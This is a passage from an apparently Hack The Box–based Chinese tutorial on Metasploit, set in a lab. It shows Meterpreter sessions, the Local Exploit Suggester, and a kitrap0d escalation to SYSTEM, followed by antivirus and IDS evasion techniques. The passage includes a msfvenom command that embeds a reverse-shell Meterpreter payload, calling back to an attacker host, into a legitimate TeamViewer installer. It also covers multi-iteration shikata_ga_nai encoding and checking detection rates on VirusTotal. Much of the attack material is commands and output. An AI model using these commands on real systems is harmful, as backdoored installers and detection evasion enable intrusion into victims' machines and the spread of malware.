<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;...SNIP...&gt;</span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:1337 </span><br><span class="line"></span><br><span class="line">[*] Sending stage (176195 bytes) to 10.10.10.5</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.5:1337 -&gt; 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: IIS APPPOOL\Web</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died</span><br></pre></td></tr></table></figure>

<p>如果 Meterpreter 会话死得太频繁，我们可以考虑对其进行编码以避免在运行时出错。我们可以选择任何可行的编码器，无论如何它最终都会提高我们成功的机会。</p>
<hr>
<h2 id="本地漏洞利用建议"><a href="#本地漏洞利用建议" class="headerlink" title="本地漏洞利用建议"></a>本地漏洞利用建议</h2><p>作为提示，有一个名为<code>Local Exploit Suggester</code>. 我们将在这个例子中使用这个模块，因为 Meterpreter shell 登陆用户<code>IIS APPPOOL\Web</code>，自然没有很多权限。此外，运行该<code>sysinfo</code>命令向我们展示了系统是 x86 位架构，让我们更有理由相信 Local Exploit Suggester。</p>
<h4 id="MSF-搜索本地漏洞利用建议者"><a href="#MSF-搜索本地漏洞利用建议者" class="headerlink" title="MSF - 搜索本地漏洞利用建议者"></a>MSF - 搜索本地漏洞利用建议者</h4><p> MSF - 搜索本地漏洞利用建议者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search local exploit suggester</span><br><span class="line"></span><br><span class="line">&lt;...SNIP...&gt;</span><br><span class="line">   2375  post/multi/manage/screenshare                                                              normal     No     Multi Manage the screen of the target meterpreter session</span><br><span class="line">   2376  post/multi/recon/local_exploit_suggester                                                   normal     No     Multi Recon Local Exploit Suggester</span><br><span class="line">   2377  post/osx/gather/apfs_encrypted_volume_passwd                              2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; use 2376</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/recon/local_exploit_suggester):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   SESSION                           yes       The session to run this module on</span><br><span class="line">   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 2</span><br><span class="line"></span><br><span class="line">session =&gt; 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.5 - Collecting local exploits for x86/windows...</span><br><span class="line">[*] 10.10.10.5 - 31 exploit checks are being tried...</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.</span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure>

<p>将这些结果摆在我们面前，我们可以轻松地选择其中一个进行测试。如果我们选择的一个最终无效，请继续进行下一个。并非所有检查都是 100% 准确的，并非所有变量都相同。往下看，<code>bypassauc_eventvwr</code>失败是因为 IIS 用户不是管理员组的一部分，这是默认和预期的。第二个选项<code>ms10_015_kitrap0d</code>可以解决问题。</p>
<h4 id="MSF-本地权限提升"><a href="#MSF-本地权限提升" class="headerlink" title="MSF - 本地权限提升"></a>MSF - 本地权限提升</h4><p> MSF - 本地权限提升</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; search kitrap0d</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                     Disclosure Date  Rank   Check  Description</span><br><span class="line">   -  ----                                     ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; use 0</span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ms10_015_kitrap0d):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  2                yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     tun0             yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     1338             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; set LPORT 1338</span><br><span class="line"></span><br><span class="line">LPORT =&gt; 1338</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; set SESSION 3</span><br><span class="line"></span><br><span class="line">SESSION =&gt; 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:1338 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 3552 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 3552...</span><br><span class="line">[*] Injecting exploit into 3552 ...</span><br><span class="line">[*] Exploit injected. Injecting payload into 3552...</span><br><span class="line">[*] Payload injected. Executing exploit...</span><br><span class="line">[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.</span><br><span class="line">[*] Sending stage (176195 bytes) to 10.10.10.5</span><br><span class="line">[*] Meterpreter session 4 opened (10.10.14.5:1338 -&gt; 10.10.10.5:49162) at 2020-08-28 17:15:56 +0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<h1 id="防火墙和-IDS-IPS-规避"><a href="#防火墙和-IDS-IPS-规避" class="headerlink" title="防火墙和 IDS&#x2F;IPS 规避"></a>防火墙和 IDS&#x2F;IPS 规避</h1><hr>
<p>为了更好地了解我们如何高效、安静地攻击目标，我们首先需要更好地了解该目标是如何防御的。我们介绍了两个新术语：</p>
<ul>
<li>端点保护</li>
<li>周界保护</li>
</ul>
<hr>
<h2 id="端点保护"><a href="#端点保护" class="headerlink" title="端点保护"></a>端点保护</h2><p><code>Endpoint protection</code>指任何本地化设备或服务，其唯一目的是保护网络上的单个主机。主机可以是个人计算机、公司工作站或网络非军事区 (De-Militarized Zone <code>DMZ</code>) 中的服务器。</p>
<p>端点保护通常以软件包的形式出现，其中包括<code>Antivirus Protection</code>, <code>Antimalware Protection</code>（这包括英国媒体报道软件、间谍软件、广告软件、恐吓软件、勒索软件），<code>Firewall</code>以及<code>Anti-DDOS</code>所有这些都在同一个软件包中。我们比后者更熟悉这种形式，因为我们大多数人都在家里的 PC 或工作场所的工作站上运行端点保护软件。Avast、Nod32、Malwarebytes 和 BitDefender 只是一些当前名称。</p>
<hr>
<h4 id="周界保护"><a href="#周界保护" class="headerlink" title="周界保护"></a>周界保护</h4><p><code>Perimeter protection</code>通常出现在网络外围边缘的物理或虚拟设备中。它们<code>edge devices</code>本身提供<code>inside</code>从 的网络访问<code>outside</code>，换句话说，从<code>public</code>到<code>private</code>。</p>
<p>在这两个区域之间，在某些情况下，我们还会发现第三个区域，称为非军事区 (De-Militarized Zone <code>DMZ</code>)，如前所述。这是一个<code>lower-security policy level</code>比一个地带<code>inside networks&#39;</code>，但比一个更高的<code>trust level</code>地带<code>outside zone</code>，这就是浩瀚的互联网。这是面向公众的服务器所在的虚拟空间，它们从 Internet 为公共客户端推送和拉取数据，但也从内部进行管理，并使用补丁、信息和其他数据进行更新，以使所服务的信息保持最新和满足服务器的客户。</p>
<hr>
<h2 id="安全政策"><a href="#安全政策" class="headerlink" title="安全政策"></a>安全政策</h2><p>安全策略是任何网络维护良好的安全状态背后的驱动力。它们的功能与 ACL（访问控制列表）对熟悉 Cisco CCNA 教育材料的任何人的作用相同。它们本质上是一个列表<code>allow</code>和<code>deny</code>语句，指示流量或文件如何存在于网络边界内。多个列表可以作用于多个网络部分，允许配置中的灵活性。这些列表还可以针对网络和主机的不同功能，具体取决于它们所在的位置：</p>
<ul>
<li>网络流量策略</li>
<li>申请政策</li>
<li>用户访问控制策略</li>
<li>文件管理政策</li>
<li>DDoS 保护策略</li>
<li>其他的</li>
</ul>
<p>虽然并非上述所有这些类别都带有“安全策略”一词，但围绕它们的所有安全机制都基于相同的基本原则运行，即和<code>allow</code>条目<code>deny</code>。唯一的区别是它们引用和应用的对象目标。所以问题仍然存在，我们如何将网络中的事件与这些规则匹配，以便可以采取前面提到的行动？</p>
<p>有多种方法可以将事件或对象与安全策略条目相匹配：</p>
<table>
<thead>
<tr>
<th><strong>安全政策</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>Signature-based Detection</code></td>
<td>数据包在网络中的操作以及与称为签名的预建和预定攻击模式的比较。与这些签名的任何 100% 匹配都会产生警报。</td>
</tr>
<tr>
<td><code>Heuristic / Statistical Anomaly Detection</code></td>
<td>与既定基线的行为比较包括已知 APT（高级持续威胁）的作案手法签名。基线将确定网络的规范以及常用的协议。任何与最大阈值的偏差都会产生警报。</td>
</tr>
<tr>
<td><code>Stateful Protocol Analysis Detection</code></td>
<td>使用普遍接受的非恶意活动定义的预建配置文件，通过事件比较来识别协议的差异。</td>
</tr>
<tr>
<td><code>Live-monitoring and Alerting (SOC-based)</code></td>
<td>专用、内部或租用的 SOC（安全运营中心）中的一组分析师使用实时馈送软件来监控网络活动和中间警报系统以发现任何潜在威胁，自行决定是否应对威胁采取行动或让自动化机制会采取行动。</td>
</tr>
</tbody></table>
<hr>
<h2 id="规避技术"><a href="#规避技术" class="headerlink" title="规避技术"></a>规避技术</h2><p>现在大多数基于主机的防病毒软件主要依赖于<code>Signature-based Detection</code>识别软件样本中存在的恶意代码的各个方面。这些签名放置在防病毒引擎内，随后用于扫描存储空间和正在运行的进程以查找任何匹配项。当一个未知软件登陆分区并被防病毒软件匹配时，大多数防病毒软件会隔离恶意程序并杀死正在运行的进程。</p>
<p>我们如何避开所有这些热量？我们和它一起玩。本节中显示的示例<code>Encoders</code>表明，对于所有 AV 产品，仅使用不同的编码方案和多次迭代对有效载荷进行编码是不够的。此外，仅在攻击者和受害者之间建立一个通信通道就可以用现有的 IDS&#x2F;IPS 产品的当前功能发出一些警报。</p>
<p>然而，随着 MSF6 版本的发布，msfconsole 可以将 AES 加密的通信从任何 Meterpreter shell 隧道传输回攻击者主机，从而在有效负载发送到受害主机时成功加密流量。这主要用于处理基于网络的 IDS&#x2F;IPS。在极少数情况下，我们可能会遇到非常严格的流量规则集，这些规则集会根据发件人的 IP 地址标记我们的连接。避免这种情况的唯一方法是找到允许通过的服务。一个很好的例子就是 2017 年的 Equifax 黑客攻击，恶意黑客滥用 Apache Struts 漏洞访问关键数据服务器网络。DNS 渗漏技术用于缓慢地将数据从网络中吸出并进入黑客的域，几个月都不会被注意到。要了解有关此攻击的更多信息，请访问以下链接：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/">美国政府关于 Equifax 黑客攻击的事后分析报告</a></li>
<li><a target="_blank" rel="noopener" href="https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411">防止 DNS 渗漏</a></li>
<li><a target="_blank" rel="noopener" href="https://www.infoblox.com/wp-content/uploads/infoblox-whitepaper-stopping-data-exfiltration-and-malware-spread-through-dns.pdf">阻止数据泄露和恶意软件通过 DNS 传播</a></li>
</ul>
<p>回到 msfconsole，它现在支持 AES 加密隧道的能力，加上 Meterpreter 在内存中运行的特性，大大提高了我们的能力。然而，我们仍然有一个问题，即有效载荷一旦到达目的地，在运行并放入内存之前会发生什么。可以对该文件的签名进行指纹识别，与数据库进行匹配，并阻止我们访问目标的机会。我们还可以确定，AV 软件开发人员正在研究 msfconsole 模块和功能，以将生成的代码和文件添加到他们的签名数据库中，从而导致大多数（如果不是全部）默认有效负载立即被 AV 软件关闭。</p>
<p>我们很幸运，因为<code>msfvenom</code>提供了使用可执行模板的选项。这允许我们为可执行文件使用一些预设模板，将我们的有效载荷注入其中（没有双关语意），并使用<code>any</code>可执行文件作为我们可以发起攻击的平台。我们可以将 shellcode 嵌入到我们手边的任何安装程序、软件包或程序中，将有效负载 shellcode 隐藏在实际产品的合法代码深处。这极大地混淆了我们的恶意代码，更重要的是，降低了我们被检测到的机会。实际的、合法的可执行文件、我们不同的编码方案（及其迭代）和我们不同的有效负载 shellcode 变体之间有许多有效组合。这会生成所谓的后门可执行文件。</p>
<p>查看下面的代码片段，了解 msfvenom 如何将有效载荷嵌入到任何可执行文件中：</p>
<p> 周界保护</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5</span><br><span class="line"></span><br><span class="line">Attempting to read payload from STDIN...</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 5 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 27 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 54 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 81 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 108 (iteration=3)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 135 (iteration=4)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 135</span><br><span class="line">Payload size: 135 bytes</span><br><span class="line">Saved as: /home/user/Desktop/TeamViewer_Setup.exe</span><br></pre></td></tr></table></figure>

<p> 周界保护</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">Pictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes</span><br></pre></td></tr></table></figure>

<p>大多数情况下，当目标启动后门可执行文件时，似乎什么也不会发生，这在某些情况下会引起怀疑。为了提高我们的机会，我们需要触发已启动应用程序的正常执行的继续，同时将有效负载从主应用程序拉到一个单独的线程中。我们使用<code>-k</code>上面显示的标志来执行此操作。然而，即使<code>-k</code>标志正在运行，如果目标从 CLI 环境启动后门可执行模板，他们只会注意到正在运行的后门。如果他们这样做，将弹出一个单独的窗口，其中包含有效载荷，直到我们在目标上完成运行有效载荷会话交互后，该窗口才会关闭。</p>
<hr>
<h2 id="档案"><a href="#档案" class="headerlink" title="档案"></a>档案</h2><p>存档文件、文件夹、脚本、可执行文件、图片或文档等信息并在存档上放置密码可绕过当今许多常见的反病毒签名。但是，此过程的缺点是它们将作为通知在 AV 警报仪表板中提出，因为由于被密码锁定而无法扫描。管理员可以选择手动检查这些档案以确定它们是否是恶意的。</p>
<h4 id="生成有效载荷-1"><a href="#生成有效载荷-1" class="headerlink" title="生成有效载荷"></a>生成有效载荷</h4><p> 生成有效载荷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5</span><br><span class="line"></span><br><span class="line">Attempting to read payload from STDIN...</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 5 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 27 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 54 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 81 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 108 (iteration=3)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 135 (iteration=4)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 135</span><br><span class="line">Payload size: 135 bytes</span><br><span class="line">Saved as: /home/user/test.js</span><br></pre></td></tr></table></figure>

<p> 生成有效载荷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cat test.js</span><br><span class="line"></span><br><span class="line">�+n&quot;����t$�G4ɱ1zz��j�V6����ic��o�Bs&gt;��Z*�����9vt��%��1�</span><br><span class="line">&lt;...SNIP...&gt;</span><br><span class="line">�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��</span><br></pre></td></tr></table></figure>

<p>如果我们检查 VirusTotal 以从我们生成的有效负载中获取检测基线，结果将如下所示。</p>
<h4 id="病毒总数"><a href="#病毒总数" class="headerlink" title="病毒总数"></a>病毒总数</h4><p> 病毒总数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msf-virustotal -k &lt;API key&gt; -f test.js </span><br><span class="line"></span><br><span class="line">[*] WARNING: When you upload or otherwise submit content, you give VirusTotal</span><br><span class="line">[*] (and those we work with) a worldwide, royalty free, irrevocable and transferable</span><br><span class="line">[*] licence to use, edit, host, store, reproduce, modify, create derivative works,</span><br><span class="line">[*] communicate, publish, publicly perform, publicly display and distribute such</span><br><span class="line">[*] content. To read the complete Terms of Service for VirusTotal, please go to the</span><br><span class="line">[*] following link:</span><br><span class="line">[*] https://www.virustotal.com/en/about/terms-of-service/</span><br><span class="line">[*] </span><br><span class="line">[*] If you prefer your own API key, you may obtain one at VirusTotal.</span><br><span class="line"></span><br><span class="line">[*] Enter &#x27;Y&#x27; to acknowledge: Y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Using API key: &lt;API key&gt;</span><br><span class="line">[*] Please wait while I upload test.js...</span><br><span class="line">[*] VirusTotal: Scan request successfully queued, come back later for the report</span><br><span class="line">[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a</span><br><span class="line">[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309</span><br><span class="line">[*] Sample SHA256 hash : 08799c1b83de42ed43d86247ebb21cca95b100f6a45644e99b339422b7b44105</span><br><span class="line">[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-1652167047</span><br><span class="line">[*] Requesting the report...</span><br><span class="line">[*] Received code 0. Waiting for another 60 seconds...</span><br><span class="line">[*] Analysis Report: test.js (11 / 59): &lt;...SNIP...&gt;</span><br><span class="line">====================================================================================================</span><br><span class="line"></span><br><span class="line"> Antivirus             Detected  Version               Result                             Update</span><br><span class="line"> ---------             --------  -------               ------                             ------</span><br><span class="line"> ALYac                 true      1.1.3.1               Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> AVG                   true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510</span><br><span class="line"> Acronis               false     1.2.0.108                                                20220426</span><br><span class="line"> Ad-Aware              true      3.0.21.193            Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> AhnLab-V3             false     3.21.3.10230                                             20220510</span><br><span class="line"> Antiy-AVL             false     3.0                                                      20220510</span><br><span class="line"> Arcabit               false     1.0.0.889                                                20220510</span><br><span class="line"> Avast                 true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510</span><br><span class="line"> Avira                 false     8.3.3.14                                                 20220510</span><br><span class="line"> Baidu                 false     1.0.0.2                                                  20190318</span><br><span class="line"> BitDefender           true      7.2                   Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> BitDefenderTheta      false     7.2.37796.0                                              20220428</span><br><span class="line"> Bkav                  false     1.3.0.9899                                               20220509</span><br><span class="line"> CAT-QuickHeal         false     14.00                                                    20220510</span><br><span class="line"> CMC                   false     2.10.2019.1                                              20211026</span><br><span class="line"> ClamAV                true      0.105.0.0             Win.Trojan.MSShellcode-6360729-0   20220509</span><br><span class="line"> Comodo                false     34607                                                    20220510</span><br><span class="line"> Cynet                 false     4.0.0.27                                                 20220510</span><br><span class="line"> Cyren                 false     6.5.1.2                                                  20220510</span><br><span class="line"> DrWeb                 false     7.0.56.4040                                              20220510</span><br><span class="line"> ESET-NOD32            false     25243                                                    20220510</span><br><span class="line"> Emsisoft              true      2021.5.0.7597         Exploit.Metacoder.Shikata.Gen (B)  20220510</span><br><span class="line"> F-Secure              false     18.10.978.51                                             20220510</span><br><span class="line"> FireEye               true      35.24.1.0             Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> Fortinet              false     6.2.142.0                                                20220510</span><br><span class="line"> GData                 true      A:25.33002B:27.27300  Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> Gridinsoft            false     1.0.77.174                                               20220510</span><br><span class="line"> Ikarus                false     6.0.24.0                                                 20220509</span><br><span class="line"> Jiangmin              false     16.0.100                                                 20220509</span><br><span class="line"> K7AntiVirus           false     12.12.42275                                              20220510</span><br><span class="line"> K7GW                  false     12.12.42275                                              20220510</span><br><span class="line"> Kaspersky             false     21.0.1.45                                                20220510</span><br><span class="line"> Kingsoft              false     2017.9.26.565                                            20220510</span><br><span class="line"> Lionic                false     7.5                                                      20220510</span><br><span class="line"> MAX                   true      2019.9.16.1           malware (ai score=89)              20220510</span><br><span class="line"> Malwarebytes          false     4.2.2.27                                                 20220510</span><br><span class="line"> MaxSecure             false     1.0.0.1                                                  20220510</span><br><span class="line"> McAfee                false     6.0.6.653                                                20220510</span><br><span class="line"> McAfee-GW-Edition     false     v2019.1.2+3728                                           20220510</span><br><span class="line"> MicroWorld-eScan      true      14.0.409.0            Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> Microsoft             false     1.1.19200.5                                              20220510</span><br><span class="line"> NANO-Antivirus        false     1.0.146.25588                                            